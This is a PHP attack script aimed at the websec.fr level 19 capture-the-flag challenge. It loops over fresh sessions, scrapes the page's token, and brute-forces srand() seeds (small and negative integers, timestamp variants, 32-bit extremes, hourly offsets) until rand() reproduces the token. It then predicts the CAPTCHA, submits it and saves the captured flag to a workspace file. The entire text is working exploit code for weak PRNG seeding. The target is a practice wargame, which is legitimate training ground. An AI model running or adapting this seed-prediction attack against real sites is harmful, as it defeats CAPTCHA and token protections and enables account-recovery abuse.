<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    EDGE CASES ATTACK - Testing unusual seed values        ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    echo "[Round $round] Token: " . substr($real_token, 0, 12) . "...\n";
    
    // Lista de seeds edge case para probar
    $edge_seeds = [];
    
    // 1. Seeds muy pequeños
    for ($i = 0; $i < 10000; $i++) {
        $edge_seeds[] = $i;
    }
    
    // 2. Valores negativos
    for ($i = -10000; $i < 0; $i++) {
        $edge_seeds[] = $i;
    }
    
    // 3. Timestamp pero con diferentes épocas
    $current = time();
    
    // Época de Windows (1601)
    $edge_seeds[] = intval(($current + 11644473600) * 10000000);
    
    // Época de Excel (1900/1904)
    $edge_seeds[] = intval(($current / 86400) + 25569);
    
    // Microsegundos desde época Unix
    $edge_seeds[] = intval($current * 1000000);
    
    // Milisegundos desde época Unix
    $edge_seeds[] = intval($current * 1000);
    
    // Nanos desde época Unix (truncado)
    $edge_seeds[] = intval($current * 1000000000) % 2147483647;
    
    // 4. Valores especiales de 32-bit
    $edge_seeds[] = 0;
    $edge_seeds[] = 1;
    $edge_seeds[] = -1;
    $edge_seeds[] = 2147483647;  // INT_MAX
    $edge_seeds[] = -2147483648; // INT_MIN
    
    // 5. Timestamp pero considerando que podría ser el inicio de la sesión
    // no el timestamp actual
    for ($offset = -86400; $offset <= 86400; $offset += 3600) {
        $edge_seeds[] = $current + $offset;
    }
    
    echo "  Testing " . count($edge_seeds) . " edge case seeds...\n";
    
    foreach ($edge_seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        
        if ($test_token === $real_token) {
            echo "\n✓✓✓ MATCH FOUND WITH EDGE CASE! ✓✓✓\n";
            echo "Seed: $seed\n";
            
            if ($seed > 1000000000 && $seed < 2000000000) {
                echo "(This is a normal Unix timestamp: " . date('Y-m-d H:i:s', $seed) . ")\n";
            }
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\nSUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    echo "  No match with edge cases\n";
    usleep(500000);
}
?>